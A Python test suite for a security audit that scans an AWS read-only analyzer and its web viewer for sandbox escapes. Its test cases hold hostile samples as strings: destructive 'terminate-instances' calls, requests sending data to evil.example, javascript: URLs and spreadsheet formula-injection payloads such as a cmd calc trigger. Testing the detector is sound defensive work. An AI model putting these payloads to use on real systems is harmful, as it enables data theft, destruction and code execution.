"""Regression tests for the security audit's viewer group: the static read-only audit must not be evaded by aliases,
dynamic imports or private executors (READONLY-4, CODE-7), it covers hooks/ and tools/, the viewer audit catches the
navigation sinks that bypassed it (VIEWER-1), and the viewer's CSV export and element factories hold up in Node
(VIEWER-1 run-time guard, VIEWER-2). Every evil module here is only parsed by the audit, never imported or run."""

import csv
import io
import json
import re
import shutil
import subprocess
import tempfile
import textwrap
import unittest
from pathlib import Path

from analyzer import audit

ROOT = Path(__file__).resolve().parent.parent
NODE = shutil.which("node")
FORMULA = re.compile(r"^[\s\"]*[=+\-@]")      # a cell a spreadsheet would evaluate (leading blanks/quotes dropped)
NUMBER = re.compile(r"^-?\d+(\.\d+)?$")

# a minimal chokepoint: the only file allowed to use subprocess, with a raw executor like the real awscli.py
CHOKEPOINT = """
    import subprocess

    def _subprocess_executor(argv, env, timeout):
        return subprocess.run(argv, env=env, capture_output=True, text=True, timeout=timeout, shell=False)

    class AwsCli:
        def __init__(self, executor=None):
            self._executor = executor or _subprocess_executor

        def call(self, service, op, args=()):
            return self._executor(["aws", service, op, *args], {}, 30)
"""


def make_tree(files: dict[str, str]) -> Path:
    """A throwaway project: keys are paths relative to the root ('pkg/x.py', 'hooks/h.py'); returns the package dir."""
    root = Path(tempfile.mkdtemp())
    for rel, body in files.items():
        p = root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(textwrap.dedent(body))
    (root / "pkg").mkdir(exist_ok=True)
    return root / "pkg"


def violations(body: str, name: str = "pkg/evil.py", **extra: str) -> list[str]:
    files = {"pkg/awscli.py": CHOKEPOINT, "pkg/allowlist.py": "ALLOWED = {}\n", name: body, **extra}
    return audit.run_audit(make_tree(files), viewer_dir=Path("/nonexistent")).violations


class TestAuditEvasions(unittest.TestCase):
    """Each construct below starts a process, runs code or reaches the network without the guard (READONLY-4, CODE-7)."""

    def assertFlagged(self, body: str, needle: str, **kw: str) -> None:
        v = violations(body, **kw)
        self.assertTrue(any(needle in x for x in v), f"not flagged ({needle!r}):\n{body}\n{v}")

    def test_import_aliases(self):
        self.assertFlagged("import subprocess as s\ns.run(['aws', 'ec2', 'terminate-instances'])\n", "forbidden import 'subprocess'")
        self.assertFlagged("from subprocess import Popen as P\nP(['aws'])\n", "forbidden import from 'subprocess'")
        self.assertFlagged("import os as o\no.system('aws ec2 terminate-instances')\n", "forbidden os.system")
        self.assertFlagged("from os import system\nsystem('aws ec2 terminate-instances')\n", "forbidden import 'os.system'")
        self.assertFlagged("from os import execvp as run\n", "forbidden import 'os.execvp'")
        self.assertFlagged("import os\nos.posix_spawnp('aws', ['aws'], {})\n", "forbidden os.posix_spawnp")
        self.assertFlagged("from os import posix_spawn\n", "forbidden import 'os.posix_spawn'")
        self.assertFlagged("from os import *\n", "star import from 'os'")

    def test_module_passed_around_as_a_value(self):
        self.assertFlagged("import os\nx = os\nx.system('aws')\n", "module 'os' used as a value")
        self.assertFlagged("import os\ngetattr(os, 'system')('aws')\n", "module 'os' used as a value")
        self.assertFlagged("import os\ngetattr(os, 'system')('aws')\n", "getattr(..., 'system')")

    def test_dynamic_import_and_code(self):
        self.assertFlagged("import importlib\nimportlib.import_module('subpro' + 'cess')\n", "forbidden import 'importlib'")
        self.assertFlagged("from importlib import import_module\n", "forbidden import from 'importlib'")
        self.assertFlagged("m = __import__('subpro' + 'cess')\n", "forbidden name '__import__'")
        self.assertFlagged("exec('import subprocess')\n", "forbidden name 'exec'")
        self.assertFlagged("code = compile('1', 'x', 'eval')\n", "forbidden name 'compile'")
        self.assertFlagged("eval('1')\n", "forbidden name 'eval'")
        self.assertFlagged("g = globals()\n", "forbidden name 'globals'")
        self.assertFlagged("import builtins\nbuiltins.exec('x')\n", "forbidden import 'builtins'")
        self.assertFlagged("import sys\nsys.modules['subprocess'].run(['aws'])\n", "forbidden sys.modules")
        self.assertFlagged("import sys\nsys._getframe(1).f_globals\n", "forbidden sys._getframe")
        self.assertFlagged("p = [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'Popen']\n",
                           "introspection '.__subclasses__'")
        self.assertFlagged("def f(o, name):\n    return getattr(o, name)\n", "getattr with a computed attribute name")

    def test_process_and_native_modules(self):
        for body, needle in (("import ctypes\nctypes.CDLL(None).system(b'aws')\n", "forbidden import 'ctypes'"),
                             ("import multiprocessing\n", "forbidden import 'multiprocessing'"),
                             ("import asyncio\nasyncio.create_subprocess_exec('aws')\n", "forbidden import 'asyncio'"),
                             ("from asyncio import create_subprocess_exec\n", "forbidden import from 'asyncio'"),
                             ("import pty\npty.spawn(['aws'])\n", "forbidden import 'pty'"),
                             ("import _posixsubprocess\n", "forbidden import '_posixsubprocess'"),
                             ("from concurrent.futures import ProcessPoolExecutor\n", "forbidden import 'concurrent.futures.ProcessPoolExecutor'"),
                             ("import concurrent.futures\nconcurrent.futures.ProcessPoolExecutor()\n", "forbidden concurrent.futures.ProcessPoolExecutor"),
                             ("import webbrowser\n", "forbidden import 'webbrowser'"),
                             ("import awscli.clidriver\n", "forbidden import 'awscli.clidriver'"),
                             ("import boto3\n", "forbidden import 'boto3'")):
            self.assertFlagged(body, needle)

    def test_network_modules(self):
        for body, needle in (("import socket\n", "forbidden import 'socket'"),
                             ("import ssl\n", "forbidden import 'ssl'"),
                             ("import http.client\n", "forbidden import 'http.client'"),
                             ("import urllib.request\nurllib.request.urlopen('http://evil.example/', data=b'x')\n", "forbidden import 'urllib.request'"),
                             ("from urllib import request\n", "forbidden import from 'urllib'"),
                             ("from http.client import HTTPSConnection\n", "forbidden import from 'http.client'")):
            self.assertFlagged(body, needle)

    def test_unreviewed_module_is_not_on_the_import_allowlist(self):
        self.assertFlagged("import platform\n", "import of 'platform' is not on the import allowlist")
        self.assertFlagged("from operator import attrgetter\n", "import of 'operator' is not on the import allowlist")

    def test_private_executor_is_out_of_reach(self):
        self.assertFlagged("from .awscli import _subprocess_executor\n_subprocess_executor(['aws', 'ec2', 'terminate-instances'], {}, 30)\n",
                           "imports the chokepoint's raw executor '_subprocess_executor'")
        self.assertFlagged("def f(ctx):\n    ctx.cli._executor(['aws', 'ec2', 'terminate-instances'], {}, 30)\n",
                           "raw executor '._executor'")
        self.assertFlagged("def f(cli):\n    return getattr(cli, '_executor')\n", "getattr(..., '_executor')")
        self.assertFlagged("import pkg.awscli\npkg.awscli._subprocess_executor(['aws'], {}, 30)\n", "raw executor '._subprocess_executor'")

    def test_renamed_executor_in_the_chokepoint_stays_protected(self):
        """The audit reads the chokepoint, so a rename there (or a name-mangled attribute) is still out of reach."""
        renamed = CHOKEPOINT.replace("_subprocess_executor", "_run_raw").replace("self._executor", "self.__runner")
        renamed += "\n    _RAW = _run_raw\n"                    # a module-level alias (same indent: make_tree dedents)
        v = audit.run_audit(make_tree({"pkg/awscli.py": renamed, "pkg/allowlist.py": "ALLOWED = {}\n",
                                       "pkg/a.py": "from .awscli import _run_raw\n",
                                       "pkg/b.py": "def f(cli):\n    cli._AwsCli__runner(['aws'], {}, 30)\n",
                                       "pkg/c.py": "from . import awscli\nawscli._RAW(['aws'], {}, 30)\n"}),
                            viewer_dir=Path("/nonexistent")).violations
        self.assertTrue(any("pkg/a.py" in x and "'_run_raw'" in x for x in v), v)
        self.assertTrue(any("pkg/b.py" in x and "'._AwsCli__runner'" in x for x in v), v)
        self.assertTrue(any("pkg/c.py" in x and "'._RAW'" in x for x in v), v)
        self.assertEqual([x for x in v if "pkg/awscli.py" in x], [], "the chokepoint itself may use them")

    def test_aws_call_entry_is_never_aliased(self):
        self.assertFlagged("def f(ctx):\n    fn = ctx.aws\n    fn('ec2', 'terminate-' + 'instances')\n", "'.aws' used without calling it")
        self.assertFlagged("import functools\ndef f(cli):\n    return functools.partial(cli.call, 'ec2')\n", "'.call' used without calling it")
        self.assertFlagged("def f(ctx):\n    return getattr(ctx, 'aws')('ec2', 'terminate-instances')\n", "getattr(..., 'aws')")

    def test_guard_and_environment_are_not_changed(self):
        self.assertFlagged("from . import allowlist\nallowlist.ALLOWED[('ec2', 'terminate-instances')] = None\n", "changes the read-only guard 'pkg.allowlist.ALLOWED'")
        self.assertFlagged("from . import allowlist\nallowlist.ALLOWED.update({})\n", "changes the read-only guard 'pkg.allowlist.ALLOWED'")
        self.assertFlagged("from .allowlist import ALLOWED\nALLOWED.clear()\n", "changes the read-only guard 'pkg.allowlist.ALLOWED'")
        self.assertFlagged("from .awscli import AwsCli\nAwsCli.call = lambda self, *a, **k: None\n", "changes the read-only guard 'pkg.awscli.AwsCli.call'")
        self.assertFlagged("from . import awscli\nawscli.check_command = lambda *a: None\n", "changes the read-only guard 'pkg.awscli.check_command'")
        self.assertFlagged("from . import awscli\nsetattr(awscli, 'check_command', print)\n", "changes the read-only guard 'pkg.awscli'")
        self.assertFlagged("from . import allowlist as al\nx = al\n", "module 'pkg.allowlist' used as a value")
        self.assertFlagged("import os\nos.environ['AWS_CONFIG_FILE'] = '/tmp/evil'\n", "changes os.environ")
        self.assertFlagged("import os\nos.environ.update(AWS_CA_BUNDLE='/tmp/ca.pem')\n", "changes os.environ")
        self.assertFlagged("from os import environ\nenviron.setdefault('AWS_PROFILE', 'admin')\n", "changes os.environ")
        self.assertFlagged("import os\nos.putenv('AWS_CONFIG_FILE', '/tmp/evil')\n", "forbidden os.putenv")

    def test_clean_module_passes(self):
        """Ordinary code, as the package writes it, is not flagged."""
        body = """
            from __future__ import annotations
            import json, os, re, sys
            from concurrent.futures import ThreadPoolExecutor
            from pathlib import Path
            from .awscli import AwsCli, check_command
            from . import allowlist

            def run(cli: AwsCli, args, ctx):
                cfg = getattr(args, "config", None)
                home = os.environ.get("HOME", "")
                ops = sorted(set(allowlist.ALLOWED))
                check_command("ec2", "describe-addresses")
                with ThreadPoolExecutor(4) as pool:
                    pool.map(len, [os.path.join(home, "x")])
                print(type(cli).__name__, file=sys.stderr)
                return ctx.aws("ec2", "describe-addresses"), cli.call("sts", "get-caller-identity"), cfg, ops

            class Demo:
                def add(self, name, v):
                    setattr(self, f"vpc_{name}", v)
        """
        self.assertEqual(violations(body), [])


class TestScriptsAreAudited(unittest.TestCase):
    """hooks/ and tools/ sit next to the package and get the same rules, and make no AWS calls at all (CODE-7)."""

    def test_hooks_and_tools_are_scanned(self):
        pkg = make_tree({"pkg/awscli.py": CHOKEPOINT,
                         "hooks/evil_hook.py": "import subprocess\nsubprocess.run(['aws', 'ec2', 'terminate-instances'])\n",
                         "tools/evil_tool.py": "import os as o\no.system('aws ec2 terminate-instances')\n"})
        v = audit.run_audit(pkg, viewer_dir=Path("/nonexistent")).violations
        self.assertTrue(any(x.startswith("hooks/evil_hook.py:1: forbidden import 'subprocess'") for x in v), v)
        self.assertTrue(any(x.startswith("tools/evil_tool.py:2: forbidden os.system") for x in v), v)

    def test_scripts_make_no_aws_calls(self):
        pkg = make_tree({"pkg/awscli.py": CHOKEPOINT,
                         "tools/t.py": "from pkg.awscli import AwsCli\nAwsCli().call('ec2', 'describe-instances')\n"})
        v = audit.run_audit(pkg, viewer_dir=Path("/nonexistent")).violations
        self.assertTrue(any("tools/t.py:2: hooks/ and tools/ make no AWS calls" in x for x in v), v)

    def test_script_may_use_the_public_guard(self):
        pkg = make_tree({"pkg/awscli.py": CHOKEPOINT,
                         "hooks/h.py": "import sys\nfrom pathlib import Path\nsys.path.insert(0, str(Path(__file__).parent))\n"
                                       "from analyzer.awscli import ReadOnlyViolation, check_command\ncheck_command('ec2', 'describe-vpcs')\n"})
        self.assertEqual(audit.run_audit(pkg, viewer_dir=Path("/nonexistent")).violations, [])

    def test_real_scripts_pass_and_are_counted(self):
        rep = audit.run_audit()
        self.assertEqual(rep.violations, [], "\n".join(rep.violations))
        expected = sum(1 for d in ("analyzer", "hooks", "tools") for p in (ROOT / d).rglob("*.py") if "__pycache__" not in p.parts)
        self.assertEqual(rep.files, expected)
        for rel in ("hooks/block_aws_writes.py", "tools/vendor_three.py", "tools/shape.py"):
            r = audit.AuditReport()
            audit._audit_source(ROOT / rel, rel, r, role="script")
            self.assertEqual(r.violations, [], rel)


class TestViewerNavigationSinks(unittest.TestCase):
    """The bypasses of the viewer audit's navigation check (VIEWER-1). CSP cannot stop a top-level navigation."""

    BYPASSES = {
        "location['href'] = 'ht' + 'tp://evil/?d=' + encodeURIComponent(JSON.stringify(A.data));": "location",
        "window.location['assign'](u);": "location",
        "location.host = 'evil.example';": "location",
        "document.location = u;": "location",
        "top.location.href = u;": "location",
        "open(u);": "open()",
        "self.open(u);": "open()",
        "const w = window; w.open(u);": "window used as a value",
        "window['op' + 'en'](u);": "computed property of a global object",
        "window['fetch'](u);": "computed property of a global object",
        "x['location'] = u;": "location",
        "AWSA.h('meta', { 'http-equiv': 'refresh', content: '0;url=' + u });": "meta refresh",
        "AWSA.h('a', { href: u }).click();": "navigating element",
        "h('form', { method: 'get' }).submit();": "navigating element",
        "document.createElement('a').click();": "createElement",
        "el.innerHTML = '<img>';": "HTML string sink",
        "el.insertAdjacentHTML('beforeend', s);": "HTML string sink",
        "a.href = u;": "URL property assignment",
        "el.setAttribute('href', u);": "setAttribute",
        "el.setAttribute(name, u);": "setAttribute",
        "const u = '//evil.example/?d=' + d;": "protocol-relative URL",
        "const u = 'javascript:alert(1)';": "URL scheme",
        "const u = 'mailto:x@evil.example?body=' + d;": "URL scheme",
        "new Function('return this')().open(u);": "dynamic code",
        "setTimeout('op' + 'en(u)', 1);": "dynamic code",
        "import('./x.js');": "dynamic import",
        "window.opener.postMessage(d, '*');": "another window",
        "const v = el.ownerDocument.defaultView;": "another window",
    }

    def scan(self, name: str, body: str) -> list[str]:
        d = Path(tempfile.mkdtemp())
        (d / name).parent.mkdir(parents=True, exist_ok=True)
        (d / name).write_text(body + "\n")
        rep = audit.AuditReport()
        audit.audit_viewer(rep, d, pins={})
        return rep.violations

    def test_bypasses_are_flagged(self):
        for body, label in self.BYPASSES.items():
            v = self.scan("js/app.js", body)
            self.assertTrue(any(label in x for x in v), f"{body!r} should be flagged as {label!r}: {v}")

    def test_markup_and_css_sinks_are_flagged(self):
        for name, body, label in (("index.html", '<meta http-equiv="refresh" content="0;url=x">', "http-equiv"),
                                  ("index.html", '<a href="x">x</a>', "navigating element in markup"),
                                  ("index.html", '<form action="x"></form>', "navigating element in markup"),
                                  ("styles.css", ".x { background: url(//evil.example/p.png) }", "CSS url()"),
                                  ("styles.css", "@import 'x.css';", "CSS url()/@import")):
            v = self.scan(name, body)
            self.assertTrue(any(label in x for x in v), f"{name}: {body!r} should be flagged as {label!r}: {v}")

    def test_download_link_exemption_is_exact_and_util_only(self):
        lines = "    const a = document.createElement('a');\n    a.setAttribute('href', url);"
        self.assertEqual(self.scan("js/util.js", lines), [])
        self.assertTrue(self.scan("js/app.js", lines), "the exemption is for util.js only")
        self.assertTrue(self.scan("js/util.js", "    a.setAttribute('href', 'https://evil.example/');"))
        self.assertTrue(self.scan("js/util.js", "    a.setAttribute('href', url); location.href = url;"))
        self.assertTrue(self.scan("js/util.js", "    const a = A.h('a', { href: url, download: filename });"),
                        "A.h refuses every <a>; the old factory-built link is no longer exempt")

    def test_real_viewer_passes(self):
        rep = audit.AuditReport()
        audit.audit_viewer(rep)
        self.assertEqual(rep.violations, [])


@unittest.skipUnless(NODE, "node is not installed")
class TestViewerRuntime(unittest.TestCase):
    """util.js in Node: the CSV export (VIEWER-2) and the element factories' navigation guard (VIEWER-1)."""

    @classmethod
    def setUpClass(cls):
        out = subprocess.run([NODE, str(ROOT / "tests" / "js" / "security.test.js")], capture_output=True, text=True,
                             timeout=60, check=False)
        if out.returncode != 0:
            raise AssertionError(out.stderr[-2000:])
        cls.res = json.loads(out.stdout)

    def test_element_factories_refuse_navigation(self):
        self.assertEqual(self.res["failures"], [])

    def test_csv_payloads_stay_one_text_cell_for_any_separator(self):
        """Spreadsheets in many locales split on ';' (or tab): a quoted field stays one cell, and none starts a formula."""
        text = self.res["csv"]
        rows = list(csv.reader(io.StringIO(text, newline="")))
        quoted = io.StringIO()
        csv.writer(quoted, quoting=csv.QUOTE_ALL, lineterminator="\n").writerows(rows)
        self.assertEqual(quoted.getvalue(), text + "\n", "every field must be quoted")
        for sep in (",", ";", "\t"):
            for row in csv.reader(io.StringIO(text, newline=""), delimiter=sep):
                for cell in row:
                    self.assertFalse(FORMULA.match(cell) and not NUMBER.match(cell), f"sep {sep!r}: formula cell {cell!r} in {row}")
        self.assertEqual(rows[1], ["x;'=cmd|' /C calc'!A0;", "NAT gateway", "-5"])
        self.assertEqual(rows[3][0], 'web;\'=HYPERLINK("http://e")')
        self.assertEqual(rows[4][1:], ["'=1+1", "'+SUM(A1)"])
        self.assertEqual(rows[6][0], "a\n'=1+1")
        self.assertEqual(rows[7][1:], ["Project=x;'=1+1;", "k=v\n'=HYPERLINK(\"http://e\")"])


if __name__ == "__main__":
    unittest.main()
